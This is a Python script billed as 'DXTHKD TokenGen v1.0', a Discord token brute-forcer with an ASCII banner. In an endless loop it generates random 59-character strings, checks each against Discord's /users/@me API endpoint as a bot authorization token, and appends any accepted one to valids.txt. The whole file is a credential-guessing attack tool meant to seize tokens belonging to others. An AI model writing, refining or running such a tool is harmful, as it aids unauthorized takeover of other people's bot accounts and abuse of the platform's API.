import random
import string
import requests
from colorama import init, Fore, Back, Style
import os
import time

os.system("cls")

os.system("mode con cols=79 lines=35")

init(convert=True)

os.system("title DXTHKD TokenGen v1.0 (stable)")

banner = """
            ▄▀▀█▄▄   ▄▀▀▄  ▄▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄ ▄▄   ▄▀▀▄ █  ▄▀▀█▄▄  
           █ ▄▀   █ █    █   █ █    █  ▐ █  █   ▄▀ █  █ ▄▀ █ ▄▀   █ 
           ▐ █    █ ▐     ▀▄▀  ▐   █     ▐  █▄▄▄█  ▐  █▀▄  ▐ █    █ 
             █    █      ▄▀ █     █         █   █    █   █   █    █ 
            ▄▀▄▄▄▄▀     █  ▄▀   ▄▀         ▄▀  ▄▀  ▄▀   █   ▄▀▄▄▄▄▀ 
           █     ▐    ▄▀  ▄▀   █          █   █    █    ▐  █     ▐  
           ▐         █    ▐    ▐          ▐   ▐    ▐       ▐       

    ▄▀▀▀█▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ █  ▄▀▀█▄▄▄▄  ▄▀▀▄ ▀▄  ▄▀▀▀▀▄   ▄▀▀█▄▄▄▄  ▄▀▀▄ ▀▄ 
   █    █  ▐ █      █ █  █ ▄▀ ▐  ▄▀   ▐ █  █ █ █ █        ▐  ▄▀   ▐ █  █ █ █ 
   ▐   █     █      █ ▐  █▀▄    █▄▄▄▄▄  ▐  █  ▀█ █    ▀▄▄   █▄▄▄▄▄  ▐  █  ▀█ 
      █      ▀▄    ▄▀   █   █   █    ▌    █   █  █     █ █  █    ▌    █   █  
    ▄▀         ▀▀▀▀   ▄▀   █   ▄▀▄▄▄▄   ▄▀   █   ▐▀▄▄▄▄▀ ▐ ▄▀▄▄▄▄   ▄▀   █   
   █                  █    ▐   █    ▐   █    ▐   ▐         █    ▐   █    ▐   
   ▐                  ▐        ▐        ▐                  ▐        ▐        
"""

print(Fore.RED + banner + Fore.WHITE)
print(Fore.LIGHTCYAN_EX + " [" + Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTRED_EX + " Starting Script...")
time.sleep(3)

os.system("cls")

def generate_fake_v6_tokens(num_tokens):
    token_length = 59
    tokens = []

    for _ in range(num_tokens):
        characters = string.ascii_letters + string.digits + '-_'
        fake_token = ''.join(random.choice(characters) for _ in range(token_length))
        tokens.append(fake_token)

    return tokens

def tokenLogin(token):
    headers = {'Authorization': f'Bot {token}'}
    src = requests.get('https://discord.com/api/v6/users/@me', headers=headers, timeout=10)

    if src.status_code == 403:
        print(Fore.CYAN + " [" + Fore.LIGHTYELLOW_EX + "-" + Fore.CYAN + "]" + Fore.LIGHTRED_EX + " ↑ " + Fore.RED + "Token Is Invalid" + Fore.LIGHTRED_EX + " ↑")
    elif src.status_code == 401:
        print(Fore.CYAN + " [" + Fore.LIGHTYELLOW_EX + "-" + Fore.CYAN + "]" + Fore.LIGHTRED_EX + " ↑ " + Fore.RED + "Token Is Invalid" + Fore.LIGHTRED_EX + " ↑")
    else:
        print(Fore.LIGHTGREEN_EX + "↑ " + Fore.GREEN + "Valid Token!" + Fore.LIGHTGREEN_EX + " ↑" + Fore.GREEN + "\n ╚═> Writing to valids.txt...")
        valid = token
        f = open("valids.txt", "a")
        f.write(valid)
        f.close()
        print(Fore.LIGHTCYAN_EX + " [" + Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTRED_EX + " Continuing Script")
        time.sleep(3)

while True:
    fake_v6_tokens = generate_fake_v6_tokens(1)
    for token in fake_v6_tokens:
        print(Fore.CYAN + " [" + Fore.LIGHTYELLOW_EX + "$" + Fore.CYAN + "]" + Fore.LIGHTBLACK_EX + " " + token)
        tokenLogin(token)
        print("")